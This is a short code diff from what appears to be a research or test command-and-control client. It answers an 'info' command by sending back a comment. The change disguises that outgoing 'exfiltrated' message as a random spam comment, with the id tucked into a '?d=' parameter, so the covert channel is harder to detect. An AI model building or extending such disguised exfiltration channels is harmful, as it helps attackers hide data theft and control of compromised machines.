@@ -36,14 +36,14 @@ while(True):
 
     command_to_execute = None
     for command in received_data:
-        command_to_execute = command.split(":")[1].strip().lower()
+        command_to_execute = command.lower()
 
     if command_to_execute == "info":
         log_print("[INFO] client: Got info command. Sending data...", 1)
         comment = Comment()
         comment.sender = sender
         comment.comment_id = generate_random_string(10)
-        comment.comment = comment.comment_id + ": Exfiltrated Data Test"
+        comment.comment = generate_random_spam_comment() + "?d=" + comment.comment_id
         send_data(channel, comment, btm_send_config)
     else:
         log_print("[INFO] client: No command to execute.", 1)
